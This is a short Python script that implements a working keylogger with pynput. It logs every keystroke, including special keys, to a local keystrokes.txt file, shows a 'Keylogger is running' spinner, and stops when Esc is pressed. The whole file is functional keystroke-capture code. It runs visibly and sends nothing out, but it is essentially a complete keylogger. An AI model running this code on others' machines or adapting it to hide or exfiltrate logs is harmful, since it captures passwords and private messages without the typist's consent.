import os
import sys
import threading
import time
from pynput.keyboard import Listener, Key

LOG_FILE = "keystrokes.txt"
running = True  # Control flag for the animation

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        global running
        running = False  # This will also stop the animation
        return False

def spinner():
    spinner_chars = "|/-\\"
    idx = 0
    while running:
        sys.stdout.write(f"\rKeylogger is running... {spinner_chars[idx % len(spinner_chars)]}")
        sys.stdout.flush()
        time.sleep(0.1)
        idx += 1
    # Clear the line after stopping
    sys.stdout.write("\rKeylogger stopped.                     \n")
    sys.stdout.flush()

def main():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    global running
    running = True

    try:
        # Start the spinner animation in a separate thread
        spin_thread = threading.Thread(target=spinner)
        spin_thread.start()

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        running = False  # Stop the spinner
        print("\nCtrl+C detected. Keylogger terminated.")
    finally:
        running = False  # Ensure spinner ends if anything else causes exit

if __name__ == "__main__":
    main()
